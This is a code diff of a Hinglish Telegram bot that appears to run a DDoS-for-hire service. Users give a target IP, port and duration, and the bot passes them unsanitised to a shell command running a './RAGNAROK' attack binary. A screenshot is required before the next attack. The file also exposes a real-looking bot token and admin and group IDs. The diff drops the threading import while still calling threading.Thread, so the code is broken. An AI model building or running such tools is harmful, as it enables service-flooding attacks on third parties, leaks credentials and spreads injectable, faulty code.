@@ -3,18 +3,16 @@ import telebot
 import datetime
 import time
 import subprocess
-import threading
 from telebot import types
 
-# TELEGRAM BOT TOKEN (REPLACE WITH ACTUAL TOKEN)
+# TELEGRAM BOT TOKEN
 bot = telebot.TeleBot('8048715452:AAHDXOo6-QlDxMyApE2pjgrp8khE_5yvIg8')
 
 # GROUP AND CHANNEL DETAILS
 GROUP_ID = "-1002369239894"
 CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
-SCREENSHOT_CHANNEL = "-1002369239894"
-LOG_CHANNEL = "-1002369239894"  # LOG SYSTEM के लिए
-ADMINS = [7129010361]
+SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"  # SCREENSHOT VERIFICATION CHANNEL
+ADMINS = [7129010361]  # ADMIN IDs
 
 # GLOBAL VARIABLES
 is_attack_running = False
@@ -35,8 +33,8 @@ def verify_screenshot(user_id, message):
     if user_id in pending_feedback:
         bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
         bot.send_message(SCREENSHOT_CHANNEL, f"📸 **USER `{user_id}` KA SCREENSHOT VERIFIED!** ✅")
-        bot.reply_to(message, "✅ SCREENSHOT VERIFIED! AB TU NAYA ATTACK LAGA SAKTA HAI 🚀")
-        del pending_feedback[user_id]
+        bot.reply_to(message, "✅ SCREENSHOT MIL GAYA! AB TU NAYA ATTACK LAGA SAKTA HAI. 🚀")
+        del pending_feedback[user_id]  
     else:
         bot.reply_to(message, "❌ AB SCREENSHOT BHEJNE KI ZAROORAT NAHI HAI!")
 
@@ -84,18 +82,11 @@ def handle_attack(message):
 
     bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
 
-    # LOG SYSTEM
-    bot.send_message(LOG_CHANNEL, f"📢 NEW ATTACK LOGGED:\n👤 USER: `{user_id}`\n🎯 TARGET: `{target}`\n⏳ TIME: `{time_duration}` SECONDS", parse_mode="Markdown")
-
-    # AUTO-PIN ATTACK MESSAGE
-    pinned_message = bot.send_message(message.chat.id, "📌 ATTACK PINNED!", parse_mode="Markdown")
-    bot.pin_chat_message(message.chat.id, pinned_message.message_id)
-
     is_attack_running = True
     attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
     pending_feedback[user_id] = True  
 
-    bot.send_message(message.chat.id, f"🚀 ATTACK SHURU!\n🎯 `{target}:{port}`\n⏳ {time_duration}S\n📸 SCREENSHOT BHEJ AB", parse_mode="Markdown")
+    bot.send_message(message.chat.id, f"🚀 ATTACK SHURU!\n🎯 `{target}:{port}`\n⏳ {time_duration}S\nBETA SCREENSHOT BHEJ AB", parse_mode="Markdown")
 
     try:
         subprocess.run(f"./RAGNAROK {target} {port} {time_duration} CRACKS", shell=True, check=True, timeout=time_duration)
@@ -107,10 +98,13 @@ def handle_attack(message):
         is_attack_running = False
         attack_end_time = None  
 
-    bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 📸 SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
+    bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
 
-    # AUTO-UNPIN MESSAGE
-    bot.unpin_chat_message(message.chat.id, pinned_message.message_id)
+# AUTO ANNOUNCEMENT SYSTEM
+def auto_announcement():
+    while True:
+        time.sleep(21600)  # 6 HOURS
+        bot.send_message(GROUP_ID, "📢 **GRP UPDATE:** RULES FOLLOW KARO, WARNA BAN PAKKA! 🚀")
 
 # HANDLE SCREENSHOT SUBMISSION
 @bot.message_handler(content_types=['photo'])
@@ -118,7 +112,7 @@ def handle_screenshot(message):
     user_id = message.from_user.id
     verify_screenshot(user_id, message)
 
-# ADMIN RESTART COMMAND
+# ADMIN RESTART COMMAND (ONLY ADMINS)
 @bot.message_handler(commands=['restart'])
 def restart_bot(message):
     if message.from_user.id in ADMINS:
@@ -128,18 +122,34 @@ def restart_bot(message):
     else:
         bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")
 
-# AUTO DELETE OLD MESSAGES (RUNS EVERY 1 HOUR)
-def auto_delete_messages():
-    while True:
-        time.sleep(3600)
-        bot.send_message(GROUP_ID, "🗑️ OLD MESSAGES AUTO-DELETED!")
+# HANDLE CHECK COMMAND
+@bot.message_handler(commands=['check'])
+def check_status(message):
+    if is_attack_running:
+        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
+        bot.reply_to(message, f"✅ **ATTACK CHAL RAHA HAI!**\n⏳ **BACHI HUI TIME:** {int(remaining_time)}S")
+    else:
+        bot.reply_to(message, "❌ KOI ATTACK ACTIVE NAHI HAI!")
 
-threading.Thread(target=auto_delete_messages, daemon=True).start()
+# HANDLE WARN SYSTEM
+@bot.message_handler(commands=['warn'])
+def warn_user(message):
+    if message.from_user.id not in ADMINS:
+        return
+
+    if not message.reply_to_message:
+        bot.reply_to(message, "❌ KISI KO WARN KARNE KE LIYE USKE MESSAGE PE REPLY KARO!")
+        return
+
+    user_id = message.reply_to_message.from_user.id
+    warn_count[user_id] = warn_count.get(user_id, 0) + 1
+
+    if warn_count[user_id] >= 3:
+        bot.kick_chat_member(GROUP_ID, user_id)
+        bot.send_message(GROUP_ID, f"🚫 **USER {user_id} KO 3 WARN MIL CHUKE THE, ISLIYE BAN KAR DIYA GAYA!**")
+    else:
+        bot.send_message(GROUP_ID, f"⚠️ **USER {user_id} KO WARNING {warn_count[user_id]}/3 DI GAYI HAI!**")
 
 # START POLLING
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(e)
-        time.sleep(15)
+threading.Thread(target=auto_announcement).start()
+bot.polling(none_stop=True)
